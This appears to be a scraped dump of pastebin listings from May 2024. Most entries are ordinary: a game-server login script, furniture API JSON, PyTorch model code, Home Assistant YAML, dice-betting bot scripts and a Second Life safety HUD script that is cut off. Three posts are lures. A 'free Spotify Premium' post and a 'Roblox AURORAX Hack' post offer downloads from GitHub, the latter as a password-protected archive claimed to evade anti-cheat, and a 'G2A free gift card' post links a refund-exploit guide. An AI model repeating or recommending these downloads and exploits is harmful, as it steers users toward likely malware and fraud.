 * To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-nd/4.0/.
 */
 
private[""_isKnownAccount""];
_uid = _this select 0;
_name = _this select 1;
if (( ""headlessclient"" in _name)  || ( ""HC_HAL"" in _name)) exitWith {};
if !(_uid in ["""", ""__SERVER__"", ""__HEADLESS__""]) then
{
	format[""Player %1 (UID %2) connected!"", _name, _uid] call ExileServer_util_log;
	_isKnownAccount = format[""isKnownAccount:%1"", _uid] call ExileServer_system_database_query_selectSingleField;
	if (_isKnownAccount) then
	{
		format[""startAccountSession:%1:%2"", _uid, _name] call ExileServer_system_database_query_fireAndForget;
	}
	else 
	{
		format[""createAccount:%1:%2"", _uid, _name] call ExileServer_system_database_query_fireAndForget;
	};
};
true"
2zvqsdqx,whenever user goes to /furnitures/furniture:id route,viscousguy,JSON,Tuesday 7th of May 2024 02:22:14 AM CDT,"{
    ""id"": 3,
    ""furniture_type_id"": 1, 
    ""room_type_id"": 1,
    ""name"": ""Plush Velvet Sofa"",
    ""description"": ""Luxurious sofa with soft velvet upholstery."",
    ""dimensions"": ""84x35x32"",
    ""price"": 799.99,
    ""contractor_id"": 3,
    ""slug"": ""plush-velvet-sofa"", 
    ""display"": true,
    ""materials"": ""Fabric, Wood, Metal"",
    ""images"": [""/images/sofa1.jpg"", ""/images/sofa2.jpg""],
    ""contractor"": {
        ""firstname"": ""Emily"",
        ""lastname"": ""Johnson"",
        ""city"": ""Chicago""
    },
    ""room_type"": ""Living Room""
}
"
8bykJRtf,whenever user goes to /furnitures route,viscousguy,JSON,Tuesday 7th of May 2024 02:14:18 AM CDT,"[
    {
        ""id"": 1,
        ""furniture_type_id"": 1, 
        ""room_type_id"": 2,
        ""name"": ""Mid-Century Modern Chair"",
        ""description"": ""Elegant chair with clean lines and tapered legs."",
        ""dimensions"": ""30x25x40"",
        ""price"": 120.75,
        ""contractor_id"": 2,
        ""slug"": ""mid-century-modern-chair"", 
        ""display"": true,
        ""materials"": ""Wood, Fabric"",
        ""images"": [""/images/chair1.jpg"", ""/images/chair2.jpg""],
        ""contractor"": {
            ""firstname"": ""Jane"",
            ""lastname"": ""Smith"",
            ""city"": ""Los Angeles""
        },
        ""room_type"": ""Bedroom""
    },
    {
        ""id"": 2,
        ""furniture_type_id"": 2, 
        ""room_type_id"": 1,
        ""name"": ""Rustic Farmhouse Table"",
        ""description"": ""Reclaimed wood table with a warm, inviting finish."",
        ""dimensions"": ""72x36x30"",
        ""price"": 450.00,
        ""contractor_id"": 1,
        ""slug"": ""rustic-farmhouse-table"", 
        ""display"": true,
        ""materials"": ""Wood"",
        ""images"": [""/images/table1.jpg""],
        ""contractor"": {
            ""firstname"": ""John"",
            ""lastname"": ""Doe"",
            ""city"": ""New York""
        },
        ""room_type"": ""Living Room""
    },
    {
        ""id"": 3,
        ""furniture_type_id"": 1, 
        ""room_type_id"": 1,
        ""name"": ""Plush Velvet Sofa"",
        ""description"": ""Luxurious sofa with soft velvet upholstery."",
        ""dimensions"": ""84x35x32"",
        ""price"": 799.99,
        ""contractor_id"": 3,
        ""slug"": ""plush-velvet-sofa"", 
        ""display"": true,
        ""materials"": ""Fabric, Wood, Metal"",
        ""images"": [""/images/sofa1.jpg"", ""/images/sofa2.jpg""],
        ""contractor"": {
            ""firstname"": ""Emily"",
            ""lastname"": ""Johnson"",
            ""city"": ""Chicago""
        },
        ""room_type"": ""Living Room""
    },
    {
        ""id"": 4,
        ""furniture_type_id"": 2, 
        ""room_type_id"": 2,
        ""name"": ""Geometric Coffee Table"",
        ""description"": ""Modern coffee table with a unique geometric base."",
        ""dimensions"": ""48x24x18"",
        ""price"": 275.50,
        ""contractor_id"": 1,
        ""slug"": ""geometric-coffee-table"", 
        ""display"": true,
        ""materials"": ""Glass, Metal"",
        ""images"": [""/images/coffeetable1.jpg""],
        ""contractor"": {
            ""firstname"": ""John"",
            ""lastname"": ""Doe"",
            ""city"": ""New York""
        },
        ""room_type"": ""Bedroom""
    },
    {
        ""id"": 5,
        ""furniture_type_id"": 1, 
        ""room_type_id"": 3, // Assuming there's a room type with the ID 3
        ""name"": ""Tufted Leather Ottoman"",
        ""description"": ""Versatile ottoman with button-tufted leather."",
        ""dimensions"": ""36x36x18"",
        ""price"": 349.00,
        ""contractor_id"": 2,
        ""slug"": ""tufted-leather-ottoman"", 
        ""display"": true,
        ""materials"": ""Leather, Wood"",
        ""images"": [""/images/ottoman1.jpg"", ""/images/ottoman2.jpg""],
        ""contractor"": {
            ""firstname"": ""Jane"",
            ""lastname"": ""Smith"",
            ""city"": ""Los Angeles""
        },
        ""room_type"": ""Bedroom"" 
    }  
]
"
TVWMSwcS,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Tuesday 7th of May 2024 01:23:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_598751.pdf

Working as of:
07 May 2024"
vMJVtT6n,Torchvision Model Wrapping,yusufbrima,Python,Tuesday 7th of May 2024 01:16:22 AM CDT,"import torch
import torch.nn as nn
from torchvision import models

modellist = [models.vgg19, models.resnet50, models.densenet121,models.efficientnet_b0]
modelnames = [model.__name__ for model in modellist]


class BackboneModel(nn.Module):
    def __init__(self, Backbone, n_channels=1, num_classes=10):
        super(BackboneModel, self).__init__()
        self.n_channels = n_channels
        self.num_classes = num_classes

        # Initialize backbone model
        self.model = Backbone(weights=None)

        # Modify layers based on backbone type
        if isinstance(self.model, models.vgg.VGG):
            self.modify_vgg()
        elif isinstance(self.model, models.resnet.ResNet):
            self.modify_resnet()
        elif isinstance(self.model, models.densenet.DenseNet):
            self.modify_densenet()
        elif isinstance(self.model, models.efficientnet.EfficientNet):
            self.modify_efficientnet()
        else:
            raise NotImplementedError(""Backbone type not supported."")

    def modify_vgg(self):
        # Modify first layer to accept n_channels input
        self.model.features[0] = nn.Conv2d(self.n_channels, 64, kernel_size=3, padding=1)

        # Modify classification layer
        num_features = self.model.classifier[-1].in_features
        self.model.classifier[-1] = nn.Linear(num_features, self.num_classes)

    def modify_resnet(self):
        # Modify first convolutional layer to accept n_channels input
        self.model.conv1 = nn.Conv2d(self.n_channels, 64, kernel_size=7, stride=2, padding=3, bias=False)

        # Modify classification layer
        num_features = self.model.fc.in_features
        self.model.fc = nn.Linear(num_features, self.num_classes)

    def modify_densenet(self):
        # Modify first convolutional layer to accept n_channels input
        self.model.features.conv0 = nn.Conv2d(self.n_channels, 64, kernel_size=7, stride=2, padding=3, bias=False)

        # Modify classification layer
        num_features = self.model.classifier.in_features
        self.model.classifier = nn.Linear(num_features, self.num_classes)

    def modify_efficientnet(self):
        # Modify first convolutional layer to accept n_channels input
        self.model.features[0][0] = nn.Conv2d(self.n_channels, 32, kernel_size=3, stride=2, padding=1, bias=False)

        # Modify classification layer
        num_features = self.model.classifier[-1].in_features
        self.model.classifier[-1] = nn.Linear(num_features, self.num_classes)

    def forward(self, x):
        return self.model(x)



# Example usage:
model = BackboneModel(modellist[3], n_channels=1, num_classes=10)
input_tensor = torch.randn(1, 1, 225, 225)  # Example input tensor with 1 channel
output = model(input_tensor)
print(output.shape)  # Example output shape
# print(model)"
pYhAmQsn,Untitled,anykeyev5,YAML,Tuesday 7th of May 2024 01:04:08 AM CDT,"# Automation
- alias: Offline Zigbee Devices
  id: offline_zigbee_devices
  description: Sends notification for offline Z2m devices
  trigger:
    - platform: time
      at: ""20:00:00""
  condition:
    - condition: template
      value_template: >
        {{states('sensor.z2m_last_seen_entities')|int > 0}}
  action:
    - service: notify.telegram
      data:
        title: Missing Devices
        message: >
          {% set phrase = 's are ' if states('sensor.z2m_last_seen_entities')|int > 1 else ' is ' %} 
          The following sensor{{ phrase }}missing: {{ state_attr('sensor.z2m_last_seen_entities', 'devices') | join(', ') }}
"
CJdrpqRQ,HA Sensor offline entities,anykeyev5,YAML,Tuesday 7th of May 2024 01:02:42 AM CDT,"# sensor
  - trigger:
      - platform: time_pattern
        hours: ""/1""
        minutes: 0
    sensor:
      - unique_id: z2m_last_seen_entities
        name: ""Z2M Last Seen Entities""
        state: >
          {% set lapsed_hours = 36 %}
          {% set ns = namespace(count=0) %}
          {% for state in states.sensor | selectattr('entity_id', 'search', '.*_last_seen$')  %}
            {% if states(state.entity_id) == 'unavailable' or ((as_timestamp(now()) - as_timestamp(states(state.entity_id),0)) > ((lapsed_hours | int) * 60 * 60)) %}
              {% set ns.count = ns.count + 1 %}
            {% endif %}
          {% endfor %}
          {{ ns.count }}     
        attributes:
          devices: >
            {% set lapsed_hours = 36 %}
            {% set result = namespace(sensors=[]) %}
            {% for state in states.sensor | selectattr('entity_id', 'search', '.*_last_seen$') %}
              {% if states(state.entity_id) == 'unavailable' or ((as_timestamp(now()) - as_timestamp(states(state.entity_id),0)) > ((lapsed_hours | int) * 60 * 60)) %}
                {% set result.sensors = result.sensors + [state.name | regex_replace(find='_last_seen', replace='') ~ ' (' ~ relative_time(strptime(states(state.entity_id), '%Y-%m-%dT%H:%M:%S%z', 'unavailable')) ~ ')'] %}
              {% endif %}
            {% endfor %}
            {{ result.sensors }}"
ghg4cRGu,FREE SPOTIFY PREMIUM for pc,jordanthebordan,GetText,Tuesday 7th of May 2024 12:59:26 AM CDT,"Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Features of Spotify Premium for PC
Unlimited Music Selection
With over 60 million tracks available, Spotify Premium for PC has a vast collection of songs from various genres, languages, and artists. From the latest releases to old favorites, you can find it all on Spotify. Plus, with personalized recommendations based on your listening history and preferences, you’ll never run out of new music to discover.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Ad-Free Listening
One of the most significant advantages of having a Premium subscription is ad-free listening. Say goodbye to those annoying interruptions and enjoy uninterrupted music streaming for hours on end.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

High-Quality Audio
Spotify Premium offers high-quality audio streaming at 320kbps, which is significantly better than the 160kbps offered in the free version. This means you can listen to your favorite songs with enhanced sound quality and clarity.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Download and Listen Offline
With Spotify Premium, you can download your favorite tracks and listen to them offline. This is perfect for those long flights or road trips where internet connectivity may be limited or non-existent.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Create and Share Playlists
Spotify allows users to create customized playlists with their favorite songs. You can also share your playlists with friends and discover new music through theirs. It’s a great way to expand your music library and connect with others through a shared love of music.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Access Across Multiple Devices
With one Spotify Premium account, you can access the service on multiple devices, including desktops, laptops, smartphones, tablets, and even gaming consoles. This makes it easy to switch between devices seamlessly without interrupting your listening experience.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

MOD Features
While there are unofficial modified versions of Spotify Premium available, it is not recommended to use them. These MOD versions may offer unlimited features for free and claim to be safer than the official app.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

If you do choose to use a MOD version of Spotify Premium, some potential benefits include:
Access to all premium features without paying for a subscription
No ads during music playback
Unlimited skips and track selection

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc
"
2e9WnPMW,snowybot lua,coinwalk,JavaScript,Tuesday 7th of May 2024 12:08:49 AM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = (balance*24000)
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
badoldbal     = ((math.floor(balance/tens))*tens)
setsoftens    = 4
resetstats()
 
function dobet()       
if ((balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights)) and (not (balance==setasseven))) then
    nextbet    = previousbet*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
WefsrgEM,snowybot lua,coinwalk,JavaScript,Tuesday 7th of May 2024 12:03:52 AM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = (balance*24000)
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
badoldbal     = ((math.floor(balance/tens))*tens)
setsoftens    = 4
resetstats()
 
function dobet()       
if ((balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights)) and (not (balance==setasseven))) then
    nextbet    = previousbet*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(nextbet*4)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
vwFW4LdT,snowybot lua,coinwalk,JavaScript,Monday 6th of May 2024 11:39:13 PM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = (balance*24000)
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
badoldbal     = ((math.floor(balance/tens))*tens)
setsoftens    = 4
resetstats()
 
function dobet()       
if ((balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights)) and (not (balance==setasseven))) then
    nextbet    = previousbet*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(balance/240)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(balance/240)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*4))<=(balance/240)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(original/240)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(original/240)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*4))<=(original/240)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
4Ce1Kkpn,Roblox AURORAX Hack,jordanthebordan,GetText,Monday 6th of May 2024 10:32:05 PM CDT,"Note
Roblox AURORA X cheat is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.
 
Features 🛠️:
ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
 
Download - https://github.com/anarxe25bearubear/licx2w
 
Tip
1. Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
2. Most importantly: the program is completely safe for your Windows system.
3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
4. Password Archive - 1234
 
 
Download - https://github.com/anarxe25bearubear/licx2w"
8mLsA2vR,Child Protect,Madi_Perth,Linden Scripting,Monday 6th of May 2024 09:33:32 PM CDT,"#include ""colors.lsl""
#include ""linksetLists.lsl""

// #define DEBUG
#include ""debug.lsl""

// define default dialog buttons
list size_menu = [""Main Menu"", "" --- "", ""Done"", ""Large"", ""Medium"", ""Small""];
list main_Menu = [""Reset"", ""Safezone"", ""Done"", ""Manual"", ""Rating"", ""Size"", ""Help""];
list rate_Menu = [""Main Menu"", "" --- "", ""Done"", ""Adult"", ""Moderate"", ""General""];

// saved safezone data
vector  safe_zone_global;   // coords on grid of safezone
vector  safe_zone_regional; // coords in sim of safezone
key     safe_zone_query;    // dataquery key for safezone
string  safe_zone_name;     // region name of safezone

// default safezone data
key     default_safeQry;
vector  default_safe_global;

key     regionQry;
integer menu_Handle;
integer menu_Channel;

// list config = [""Auto"", ""MATURE"", ""Medium""];

integer hudFlags = 1;

// hud mode flags
#define AUTO  1 // Automatically TP to Safezone;

// hud size flags
integer hud_size;   // size of hud
#define SMALL   1   // small hud size
#define MEDIUM  2   // Medium hud size
#define LARGE   3   // Large hud size

// hud rating 
integer rating_score;
#define GENERAL     1   //general rating
#define MODERATE    2   // moderate rating
#define ADULT       3   // adult raiting

// misc flag variables
integer warningShown = 0;
integer soundPlayed = 0;



// has the avatar teleported to safe zone
integer tp_Flag;
#define TPPED   0x001

string getRatingLevel()
{
    string tm;
    switch (rating_score)
    {
        case ADULT:
        {
            tm = ""Adult."";
            break;
        }
        case MODERATE:
        {
            tm = ""Moderate."";
            break;
        }
        case GENERAL:
        {
            tm = ""General."";
            break;
        }
    }
    return tm;
}

// create the text for the hud size dialog
string mk_hudsize()
{
    string ts = ""Select Hud Size.\n\n\tCurrent Hud Size is "";
    switch (hud_size)
    {
        case SMALL:
        {    
            ts += ""Small"";
            break;
        }
        case MEDIUM:
        {    
            ts += ""Medium"";
            break;
        }
        case LARGE:
        {    
            ts += ""Large"";
            break;
        }
    }
    return ts += ""\n"";
}

// create the main menu text
string mk_menu()
{
    string tm = ""Main Menu:\n\n\tTeleport Mode is "";

    if (hudFlags == AUTO)
        tm += ""Auto"";
    else
        tm += ""Manual"";

    tm += ""\n\tSim Rating is "";

    switch (rating_score)
    {
        case ADULT:
        {
            tm += ""Adult."";
            break;
        }
        case MODERATE:
        {
            tm += ""Moderate."";
            break;
        }
        case GENERAL:
        {
            tm += ""General."";
            break;
        }
    }

    tm += ""\n\tCurrent Safe Zone is "";

    if(safe_zone_name != """")
        tm += safe_zone_name;
    else 
        tm += ""WelcomeHub"";

    return tm += ""\n""; 
}


// replace single list entries with 
list replaceListEntry( list entry, string  replace, string with )
{
    integer  index = llListFindList(entry, (list) replace);
    DS(""index = "" + (string) index);
    if(index == -1)
        return entry;
    else
        return llListReplaceList(entry, (list) with, index, index);
}

//Created by Ugleh Ulrik
//This sort of script should cost, but for you free :)
//Edited by Taff Nouvelle to put the buttons in correct order.
list order_buttons(list buttons)
{
    return buttons;
    // return llList2List(buttons, -3, -1) + llList2List(buttons, -6, -4) +
    //     llList2List(buttons, -9, -7) + llList2List(buttons, -12, -10);
}

default
{
    state_entry()
    {

        // cache textures
        llSetTexture(""119e28e5-1043-0dc0-864e-a403092a4c2a"", 1);
        llSetTexture(""1fb10f43-10c6-844e-fb94-a78dbc30ed9b"", 1);
        llSetTexture(""723386b5-e554-8430-d464-26d168f3aa58"", 1);
        llSetTexture(""2104d080-0e63-248a-5a90-1fb209c0d25f"", 1);
        llOwnerSay(""Press hud for 2 or more seconds for Main Menu."");

        // set the default size to medium 
        llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.05000, 0.05000, 0.05000>]);
        hud_size = MEDIUM;

        // open channels and set basic texture
        menu_Channel = 0x80000000 | (integer)llFrand(65536) | ((integer)llFrand(65536) << 16);
        menu_Handle = llListen(menu_Channel, """", llGetOwner(), """");
        llSetTexture(""2104d080-0e63-248a-5a90-1fb209c0d25f"", ALL_SIDES);

        // load safezone if saved to linksetdata
        list    tl;
        string  ts;
        if((ts = llLinksetDataRead(""safezone"")) != """")
        {
            // parse saved safezone
            DS(ts);
            tl = llCSV2List(ts);
            safe_zone_global = (vector) llList2String(tl, 0);
            safe_zone_regional = (vector) llList2String(tl, 1);
            safe_zone_name = llList2String(tl, 2);
            DS((string) safe_zone_global);
            DS((string) safe_zone_regional);
            DS((string) safe_zone_name);                        
            
        }
        // else load default safezone
        else 
        {
            // use default WelcomeHub zone
            llOwnerSay(""No saved Safezone found.\nUsing WelcomeHub as default."");
            default_safeQry = llRequestSimulatorData(""WelcomeHub"", DATA_SIM_POS);
        }
        rating_score = 2;   // set default sim score to moderate
        // ask permission then start hud
        llRequestPermissions(llGetOwner(), PERMISSION_TELEPORT);
    }

    listen( integer channel, string name, key id, string message )
    {
        switch(message)
        {
            case ""Help"":
            {
                llGiveInventory(llGetOwner(), ""Instructions"");
                break;
            }
            // goto safezone
            case ""GO!"":
            {
                vector global;
                vector regional = <128, 128, 20>;

                if(safe_zone_name != """")
                {
                    global = safe_zone_global;
                    regional = safe_zone_regional;
                }
                else 
                {
                    global = default_safe_global;
                }

                warningShown = 1;
                llTeleportAgentGlobalCoords(llGetPermissionsKey(), 
                    global, 
                    regional, 
                    ZERO_VECTOR);
                break;

            }
            // set safezone
            case ""Safezone"":
            {
                safe_zone_name = llGetRegionName();
                safe_zone_query = llRequestSimulatorData(safe_zone_name, DATA_SIM_POS);
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            // reset the hud
            case ""Reset"":
            {
                llDialog(llGetOwner(), ""Reset Hud? "", [""Yes"", ""No""], menu_Channel);
                break;
            }
            // answer 'Yes'to reset the hud
            case ""Yes"":
            {
                llOwnerSay(""Reseting hud and deleting data."");
                llLinksetDataReset();
                llResetScript();
                break;
            }
            // size of the hud
            case ""Size"":
            {
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            case ""Large"":
            {
                llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.10000, 0.10000, 0.10000>]);
                hud_size = LARGE;
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            case (""Medium""):
            {
                hud_size = MEDIUM;
                llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.05000, 0.05000, 0.05000>]);
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            case (""Small""):
            {
                hud_size = SMALL;
                llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.10000, 0.02500, 0.02500>]);
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            // hud mode of operation
            case ""Auto"":
            {
                hudFlags =  AUTO;
                DS(""hudflags "" + (string) hudFlags );
                main_Menu = replaceListEntry(main_Menu, ""Auto"", ""Manual"");
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            case ""Manual"":
            {
                hudFlags = 0;
                DS(""hudflags "" + (string) hudFlags );
                main_Menu = replaceListEntry(main_Menu, ""Manual"", ""Auto"");
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            // go back to main menu
            case ""Main Menu"":
            {
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            // ratings dialog
            case ""Rating"":
            {
                // build menu for sim rating dialog
                string ts = ""\n\n\tCurrent setting is "";
                switch (rating_score)
                {
                    case ADULT:
                    {
                        ts += ""Adult."";
                        break;
                    }
                    case MODERATE:
                    {
                        ts += ""Moderate."";
                        break;
                    }
                    case GENERAL:
                    {
                        ts += ""General."";
                        break;
                    }
                }
                ts += ""\n"";

                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                break;
            }
            // case for selecting sim level rating
            case ""Adult"":
            {
                rating_score = ADULT;
                warningShown = 0;
                string ts = ""\n\n\tCurrent setting is "" + getRatingLevel();
                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                
                break;
            }
            case ""Moderate"":
            {
                rating_score = MODERATE;
                warningShown = 0;
                string ts = ""\n\n\tCurrent setting is "" + getRatingLevel();
                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                
                break;
            }
            case ""General"":
            {
                rating_score = GENERAL;
                warningShown = 0;
                string ts = ""\n\n\tCurrent setting is "" + getRatingLevel();
                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                
                break;
            }
        }
        DS(""ratings score "" + (string) rating_score);
    }

    // ask for teleport premission 
    run_time_permissions(integer perm)
    {
        if (PERMISSION_TELEPORT & perm)
        {
            regionQry = llRequestSimulatorData(llGetRegionName(), DATA_SIM_RATING);
            llSetTimerEvent(5.0);
        }
        else 
        {
            llOwnerSay(""Hud will not function correctly without teleport premission.\nReattach hud to rest premissions."");
        }
    }

    // check to sim ratings ever 5 seconds
    timer()
    {
        regionQry = llRequestSimulatorData(llGetRegionName(), DATA_SIM_RATING);
    }

    attach( key id )
    {
        // upon attaching display basic settings 
        string ts = ""Current settings are\n"";

        if(hudFlags == AUTO)
            ts += ""\tTeleport Mode is set to Auto."";
        else 
            ts += ""\tTeleport Mode is set to Manual."";

        ts += ""\n\tCurrent Sim limit is "";
        switch (rating_score)
        {
            case ADULT:
            {
                ts += ""Adult."";
                break;
            }
            case MODERATE:
            {
                ts += ""Moderate."";
                break;
            }
            case GENERAL:
            {
                ts += ""General."";
                break;
            }
        }
        ts += ""\n\tCurrent Safezone is "";

        if(safe_zone_name != """")
            ts += safe_zone_name;
        else 
            ts += ""WelcomeHub"";

        // then request premission to tp
        if(id)
        {
            llOwnerSay(ts);  
            llRequestPermissions(llGetOwner(), PERMISSION_TELEPORT);
        } 
    }

    dataserver( key queryid, string data )
    {
        // getting the curren location when the safezone
        // button is pushed 
        if(safe_zone_query == queryid)
        {
            list tl;

            tl = llGetParcelDetails(llGetPos(), [PARCEL_DETAILS_NAME]);
            safe_zone_global = (vector) data;
            safe_zone_regional = llGetPos();
            llOwnerSay(""Safezone set to "" + safe_zone_name 
                + "", "" + llList2String(tl, 0));
            llLinksetDataWrite(""safezone"", (string) safe_zone_global +"",""+ (string) safe_zone_regional+"",""+safe_zone_name );
            DS(llLinksetDataRead(""safezone""));
        }

        // get location on grid of default safezone
        // currently the G rated WelcomeHub sim
        if(default_safeQry == queryid)
        {
            default_safe_global = (vector) data;
        }

        // set texture depending on sim rating
        // green - PG
        // blue - moderate or mature
        // red - adult (never safe)        
        if(queryid == regionQry)
        {
            integer sim_score;

            switch (data)
            {
                case (""PG""):
                {
                    sim_score = 0;
                    llSetTexture(""119e28e5-1043-0dc0-864e-a403092a4c2a"", ALL_SIDES);
                    break;
                }
                case (""MATURE""):
                {
                    sim_score = 2;
                    llSetTexture(""1fb10f43-10c6-844e-fb94-a78dbc30ed9b"", ALL_SIDES);
                    break;
                }
                default:
                {
                    sim_score = 3;
                    llSetTexture(""723386b5-e554-8430-d464-26d168f3aa58"", ALL_SIDES);
                    break;
                }
            }

            //  monitoring sim rating and tp to savezone
            // if rating exceeds safty score
            if(sim_score > rating_score)
            {

                string ts;

                if(safe_zone_name != """")
                    ts = safe_zone_name;
                else
                    ts = ""WelcomeHub"";

                if(hudFlags == AUTO && warningShown == 0)
                {
                    vector global;
                    vector regional = <128, 128, 20>;

                    DS(safe_zone_name);
                    if(safe_zone_name != """")
                    {
                        global = safe_zone_global;
                        regional = safe_zone_regional;
                    }
                    else 
                    {
                        global = default_safe_global;
                    }
                    DS((string) global);
                    DS((string) regional);
#ifndef DEBUG
                    if(llGetRegionName() != safe_zone_name || llGetRegionName() == ""WelcomeHub"")
                    {
                        llTeleportAgentGlobalCoords(llGetPermissionsKey(), 
                            global, 
                            regional, 
                            ZERO_VECTOR);
                        llDialog(llGetOwner(), 
                            ""Region Rating Surpassed Safty Settings\n\nAvatar Sent to SafeZone at "" + ts +""."", 
                            [""Ok""], menu_Channel);
                    }
#endif
                }
                else if (warningShown == 0) 
                {
                    if(llGetRegionName() != safe_zone_name && llGetRegionName() != ""WelcomeHub"")
                    { 
                        string tb = getRatingLevel();
